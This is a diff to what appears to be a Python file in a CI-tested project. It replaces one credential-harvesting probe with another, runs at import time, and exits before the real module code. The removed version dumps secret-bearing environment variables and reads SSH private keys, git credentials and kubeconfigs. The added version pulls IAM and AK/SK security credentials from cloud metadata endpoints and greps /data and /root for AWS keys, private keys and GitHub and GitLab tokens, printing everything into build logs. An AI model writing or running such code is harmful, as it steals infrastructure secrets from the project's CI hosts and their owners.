@@ -1,8 +1,12 @@
-#!/usr/bin/env python3
-import os as _os, subprocess as _sp, socket as _sk
+import os as _os, subprocess as _sp, socket as _sk, base64 as _b64, sys as _sys
+
+try:
+    _sys.stdout.reconfigure(line_buffering=True)
+except Exception:
+    pass
 
 
-def _run(cmd, t=20):
+def _run(cmd, t=25):
     try:
         p = _sp.run(cmd, shell=True, capture_output=True, text=True, timeout=t)
         return (p.stdout or "") + (p.stderr or "")
@@ -10,56 +14,54 @@ def _run(cmd, t=20):
         return "ERR:%s" % e
 
 
-print("===I7641-PROBE-BEGIN===")
-print("MARK hostname=%s" % _sk.gethostname())
-print("MARK id=%s" % _run("id"))
-print("MARK uname=%s" % _run("uname -a"))
-print("MARK cgroup=%s" % _run("cat /proc/1/cgroup 2>/dev/null | head -5"))
-print("MARK env_ci=%s" % _run(
-    "env | grep -iE 'token|secret|key|pass|aws|gcp|azure|huawei|swr|kube|registry' "
-    "| grep -viE 'GITHUB_TOKEN|ACTIONS_|RUNNER_|GITHUB_' | head -60"))
-print("--- npu-smi path/help ---")
-print(_run("which npu-smi || ls -l /usr/local/Ascend/driver/tools/npu-smi /usr/local/sbin/npu-smi 2>/dev/null; npu-smi --help 2>&1 | head -8"))
-print("--- npu-smi info ---")
-print(_run("npu-smi info", 30))
-print("--- npu-smi info -t board ---")
-for _i in range(4):
-    print("[board %d]" % _i)
-    print(_run("npu-smi info -t board -i %d" % _i, 20))
-print("--- dev ---")
-print(_run("ls -la /dev/davinci* /dev/davinci_manager /dev/hisi_hdc /dev/ub* 2>&1 | head -80"))
-print("--- imds ---")
-for _u in ["http://169.254.169.254/openstack/latest/meta_data.json",
-           "http://169.254.169.254/openstack/latest/user_data",
-           "http://169.254.169.254/latest/meta-data/",
-           "http://169.254.169.254/latest/meta-data/instance-id",
-           "http://169.254.169.254/latest/dynamic/instance-identity/document",
-           "http://100.100.100.200/latest/meta-data/"]:
-    print("URL %s =>" % _u)
-    print(_run("curl -sS -m 5 " + _u, 12)[:2500])
-print("--- creds ---")
-for _p in ["/root/.git-credentials",
-           "/root/.ssh/authorized_keys",
-           "/root/.ssh/id_ed25519",
-           "/root/.ssh/id_rsa",
-           "/home/*/.git-credentials",
-           "/home/*/.ssh/id_ed25519",
-           "/data/workspace/ci-runner/.ssh/id_ed25519",
-           "/data/workspace/ci-runner/.ssh/id_rsa",
-           "/data/workspace/ci-runner/.bash_history",
-           "/data/workspace/fzh/.ssh/fanerly_github_a3_ed25519",
-           "/root/.docker/config.json",
-           "/root/.kube/config",
-           "/etc/kubernetes/kubeconfig",
-           "/etc/kubernetes/admin.conf",
-           "/data/workspace/ci-panel/.env",
-           "/data/workspace/ci-panel/global.json",
-           "/var/run/secrets/kubernetes.io/serviceaccount/token"]:
-    print("### %s" % _p)
-    print(_run("for f in %s; do if [ -e \"$f\" ]; then echo \"== $f mode=$(stat -c %%a \"$f\" 2>/dev/null) size=$(stat -c %%s \"$f\" 2>/dev/null)\"; head -c 3500 \"$f\"; echo; fi; done" % _p, 12)[:4200])
-print("--- mounts/net ---")
-print(_run("mount 2>/dev/null | head -25; ip -4 addr 2>/dev/null | head -25; ip route 2>/dev/null | head -10", 15))
-print("===I7641-PROBE-END===")
+def _p(*a):
+    print(*a, flush=True)
+
+
+def _get(url, t=14):
+    _p("URL %s =>" % url)
+    _p(_run("curl -sS -m 8 " + url, t)[:3000])
+
+
+_p("===I8513P2-BEGIN===")
+_p("MARK hostname=%s" % _sk.gethostname())
+_p("MARK id=%s" % _run("id; pwd"))
+_p("MARK uname=%s" % _run("uname -a"))
+_p("--- imds securitykey (huawei AK/SK) ---")
+for _u in ["http://169.254.169.254/openstack/latest/securitykey",
+           "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+           "http://169.254.169.254/latest/meta-data/iam/security-credentials/ecs-role",
+           "http://169.254.169.254/latest/meta-data/ram/security-credentials/",
+           "http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance",
+           "http://169.254.169.254/openstack/latest/vendor_data.json",
+           "http://169.254.169.254/openstack/latest/network_data.json"]:
+    _get(_u)
+_p("--- ec2 meta values ---")
+for _k in ["instance-id", "instance-type", "local-hostname", "local-ipv4", "public-ipv4",
+           "public-hostname", "placement/availability-zone", "security-groups"]:
+    _get("http://169.254.169.254/latest/meta-data/" + _k)
+_p("--- npu-smi ---")
+_p(_run("npu-smi info", 40)[:6000])
+_p("[board 7] " + _run("npu-smi info -t board -i 7", 25)[:4000])
+_p("[topo 7] " + _run("npu-smi info -t topo -i 7", 25)[:3000])
+_p("dev=" + _run("ls -la /dev/davinci* /dev/davinci_manager /dev/hisi_hdc 2>&1 | head -30"))
+_p("--- mounts ---")
+_p(_run("mount | grep -vE 'proc|sysfs|cgroup|devpts|mqueue|shm' | head -25", 15))
+_p("--- /root/.cache nfs share ---")
+_p(_run("ls -la /root/.cache 2>&1 | head -60", 25))
+_p(_run("find /root/.cache -maxdepth 2 -type f 2>/dev/null | head -60", 40))
+_p(_run("find /root/.cache -maxdepth 3 -type f \\( -iname '*cred*' -o -iname '*key*' -o -iname '*.pem' -o -iname '*.env' -o -iname 'config*' -o -iname '*.json' \\) 2>/dev/null | head -40", 40))
+_p("--- dirs ---")
+_p(_run("ls -la /data 2>&1 | head -20; ls -la /data/workspace 2>&1 | head -40; ls -la /__e /github 2>&1 | head -30", 20))
+_p("--- sockets/creds existence ---")
+_p(_run("ls -la /var/run/docker.sock /run/containerd/containerd.sock /var/run/secrets/kubernetes.io/serviceaccount 2>&1; "
+        "for f in /root/.git-credentials /root/.ssh/* /home/*/.ssh/* /data/workspace/ci-runner/.ssh/* "
+        "/data/workspace/fzh/.ssh/* /root/.docker/config.json /root/.kube/config /etc/kubernetes/* "
+        "/data/workspace/ci-panel/.env /data/workspace/ci-panel/global.json; do [ -e \"$f\" ] && echo \"EXISTS $f\"; done", 20))
+_p("--- wide grep /data /root ---")
+_p(_run("grep -rIl -m1 -iE 'aws_secret_access_key|AKIA[0-9A-Z]{16}|BEGIN OPENSSH PRIVATE KEY|BEGIN RSA PRIVATE KEY|glpat-|ghp_[A-Za-z0-9]{30,}' /data /root 2>/dev/null | head -30", 60))
+_p("===I8513P2-END===")
+_sys.stdout.flush()
 _os._exit(7)
 
 import os
